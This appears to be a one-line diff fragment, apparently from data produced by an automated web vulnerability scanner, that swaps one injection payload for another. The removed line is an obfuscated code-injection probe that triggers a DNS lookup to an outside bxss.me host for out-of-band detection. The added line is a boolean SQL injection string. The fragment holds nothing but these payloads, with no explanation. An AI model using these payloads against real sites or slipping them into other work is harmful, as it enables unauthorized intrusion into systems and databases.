@@ -1,1 +1,1 @@
-".gethostbyname(lc("hitue"."ncjnlcfneaa40.bxss.me."))."A".chr(67).chr(hex("58")).chr(117).chr(77).chr(115).chr(86)."
+-1' OR 2+490-490-1=0+0+0+1 or '0h5OSZ1y'='
